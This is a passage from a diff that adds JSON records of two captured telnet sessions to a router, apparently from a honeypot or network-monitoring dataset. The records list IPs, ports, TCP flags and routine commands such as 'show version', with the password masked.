+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.20.45",
+          "payload": "Password: "
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "********"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.20.45",
+          "payload": "Router> "
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "enable"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.20.45",
+          "payload": "Router# "
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "show version"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "show interfaces"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "exit"
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "\r\n"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 44009,
+        "src_ip": "10.17.4.48",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 2323,
+        "dst_ip": "10.17.20.45"
+      },
+      "id": 1045,
+      "timestamp": "2026-04-07T14:41:57.000000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "telnet",
+      "protocol_data": [
+        {
+          "sender_ip": "10.17.20.45",
+          "payload": "login: "
+        },
+        {
+          "sender_ip": "10.17.4.25",
+          "payload": "<client disconnect>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 44014,
+        "src_ip": "10.17.4.25",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 23,
+        "dst_ip": "10.17.20.45"
+      },
+      "id": 1050,
+      "timestamp": "2026-04-07T14:43:02.000000Z"
+    }
+  ]
+}
